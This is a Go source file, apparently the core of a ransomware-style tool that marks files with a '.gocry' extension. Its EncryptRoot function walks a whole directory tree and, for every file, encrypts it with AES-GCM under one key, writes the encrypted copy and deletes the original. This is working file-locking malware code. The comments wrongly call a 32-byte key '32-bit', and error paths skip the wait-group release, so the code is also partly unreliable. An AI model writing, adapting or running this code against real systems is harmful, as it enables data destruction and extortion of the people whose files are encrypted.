package crypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"sync"
)

// encryptSingleFile takes in a file path and a 32-bit random key and uses AES-GCM-256 encryption
// to encrypt the file. It also adds the .gocry extension to the files.
func encryptSingleFile(wg *sync.WaitGroup, path string, key []byte) error {
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}

	block, _ := aes.NewCipher(key)
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	if err := ioutil.WriteFile(path+".gocry", gcm.Seal(nonce, nonce, data, nil), 0666); err != nil {
		return err
	}

	if err := os.Remove(path); err != nil {
		return err
	}

	wg.Done()

	return nil
}

// EncryptRoot takes in a starting path and a 32-bit random encryption key. It encrypts all files and
// all of the subdirectories. It used to be a recursive function, but I think that filepath.Walk has
// better performance.
func EncryptRoot(startingPath string, key []byte) error {
	var wg sync.WaitGroup
	if err := filepath.Walk(startingPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// This for some reason causes the problem that files rae not decrypted at all
		if info.IsDir() {
			return nil
		}

		wg.Add(1)
		go encryptSingleFile(&wg, path, key)

		return nil
	}); err != nil {
		return err
	}

	wg.Wait()

	return nil
}
